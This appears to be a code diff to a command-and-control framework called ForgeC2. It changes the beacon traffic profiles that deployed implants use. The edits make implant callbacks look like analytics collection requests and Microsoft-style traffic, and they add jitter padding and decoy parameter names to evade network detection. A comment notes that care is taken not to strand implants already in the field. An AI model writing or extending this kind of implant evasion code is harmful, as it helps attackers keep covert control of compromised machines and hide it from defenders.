@@ -240,23 +240,32 @@ func PredefinedProfiles() map[string]*Profile {
 }
 
 // DefaultProfile returns the default ForgeC2 profile.
+//
+// NOTE on changing URIs here: baked agents and the server's NoRoute beacon
+// handling key on /collect. Extending the pool is safe (agents rotate when
+// the server delivers BeaconURIs), but REMOVING /collect would strand
+// deployed implants — keep it first.
 func DefaultProfile() *Profile {
 	return &Profile{
 		Name:        "default",
 		Description: "Default ForgeC2 beacon profile",
 		HttpGet: HTTPGet{
-			URI:  []string{"/collect"},
+			URI:  []string{"/collect", "/r/collect", "/j/collect"},
 			Verb: "GET",
 			Headers: map[string]string{
 				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
 			},
 		},
 		HttpPost: HTTPPost{
-			URI:  []string{"/collect"},
+			URI:  []string{"/collect", "/batch"},
 			Verb: "POST",
 			Headers: map[string]string{
 				"Content-Type": "application/json",
 			},
+		},
+		Jitter: JitterCfg{
+			ContentLength:  512,
+			ParameterNames: []string{"v", "t", "id", "s", "q", "r", "x", "z"},
 		},
 	}
 }
@@ -308,6 +317,10 @@ func MicrosoftProfile() *Profile {
 					{Type: "xor", Value: "microsoft"},
 				},
 			},
+		},
+		Jitter: JitterCfg{
+			ContentLength:  512,
+			ParameterNames: []string{"id", "sid", "cid", "op", "data", "auth", "token", "ptid"},
 		},
 	}
 }
